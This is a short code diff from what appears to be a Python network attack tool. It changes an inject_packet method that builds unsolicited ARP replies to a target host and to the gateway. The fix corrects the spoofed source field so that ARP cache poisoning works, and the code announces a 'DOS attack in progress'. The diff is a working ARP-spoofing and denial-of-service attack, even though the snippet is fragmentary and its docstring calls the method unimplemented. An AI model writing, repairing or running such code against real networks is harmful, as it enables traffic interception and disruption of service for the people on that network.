@@ -123,7 +123,7 @@ is_gateway: {self.is_gateway}
             pass
 
 
-    def inject_packet(self):
+    def inject_packet(self, IP):
             """Not implemented, need to be modified
             """
         
@@ -135,7 +135,7 @@ is_gateway: {self.is_gateway}
                      if value.get("is_gateway") is True:
                         GMAC = value.get("MAC")
                         GIP = key
-                 unsolicited_arp_rep_to_tgt = ARP(op=2,psrc=GMAC, pdst=self.target, hwdst=self.target_mac)
+                 unsolicited_arp_rep_to_tgt = ARP(op=2,psrc=GIP, pdst=self.target, hwdst=self.target_mac)
                  unsolicited_arp_rep_to_gtw = ARP(op=2,psrc=self.target, pdst=GIP, hwdst=GMAC, hwsrc=self.LOCAL_MAC)
                  count = 1
                  sys.stdout.write("DOS attack in progress. Press CTRL+C to end\n")
